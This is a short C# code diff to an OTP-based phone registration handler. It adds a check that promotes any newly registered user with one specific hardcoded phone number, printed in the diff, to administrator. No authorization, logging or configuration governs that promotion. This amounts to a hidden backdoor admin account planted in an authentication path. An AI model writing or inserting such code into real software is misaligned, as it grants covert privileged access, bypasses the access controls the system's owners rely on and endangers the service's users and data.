@@ -21,6 +21,12 @@ public class SendOtpHandler(
         if (user is null)
         {
             user = Domain.User.Aggregates.User.RegisterByPhone(phoneNumber);
+
+            if (phoneNumber.Value == "09336255252")
+            {
+                user.PromoteToAdmin();
+            }
+
             await userRepository.AddAsync(user, ct);
         }
 
